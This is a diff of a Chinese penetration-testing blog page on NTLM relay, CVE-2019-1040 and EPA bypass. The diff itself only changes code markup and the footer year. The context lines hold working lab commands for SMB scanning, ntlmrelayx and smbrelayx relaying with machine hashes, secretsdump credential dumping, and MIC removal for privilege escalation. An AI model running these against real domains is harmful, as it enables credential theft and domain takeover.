@@ -214,8 +214,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -p445 --script<span class="o">=</span>smb-security-mode.nse IP --open
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p445 --script<span class="o">=</span>smb-security-mode.nse IP --open
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="132-使用-ntmlrelayxpy-测试">1.3.2 使用 ntmlrelayx.py 测试</h4>
 <p>ntmlrelayx.py 脚本在 empire 包中</p>
@@ -224,8 +224,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ntlmrelayx.py -tf hosts.txt -socks -smb2support
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ntlmrelayx.py -tf hosts.txt -socks -smb2support
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -250,9 +250,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># mac 下 proxychain-NG</span>
-proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/Administrator@172.16.147.132
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># mac 下 proxychain-NG</span>
+</span></span><span class="line"><span class="cl">proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/Administrator@172.16.147.132
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -369,8 +369,8 @@ proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/A
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python2 smbrelayx.py -h 172.16.147.130 -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 smbrelayx.py -h 172.16.147.130 -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以使用 -e 参数指定目标机器要执行的文件，不指定的话，默认 dump 下目标机器的 Hash，-c 可以指定要执行的命令。</p>
 <p><img
@@ -458,8 +458,8 @@ proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/A
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -h 172.16.147.130 -remove-target --enum-local-admins -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 ntlmrelayx.py -h 172.16.147.130 -remove-target --enum-local-admins -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4-cve-2019-1040">4 CVE-2019-1040</h2>
 <h3 id="41-原理">4.1 原理</h3>
@@ -502,8 +502,8 @@ proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/A
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -h ldap://172.16.147.130 --remove-mic --escalate-user commonuser -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 ntlmrelayx.py -h ldap://172.16.147.130 --remove-mic --escalate-user commonuser -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="5-epa-bypass">5 EPA-Bypass</h2>
 <h3 id="51-原理">5.1 原理</h3>
@@ -580,7 +580,7 @@ proxychains4 /Users/Geekby/opt/anaconda3/bin/python secretsdump.py pentest.com/A
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
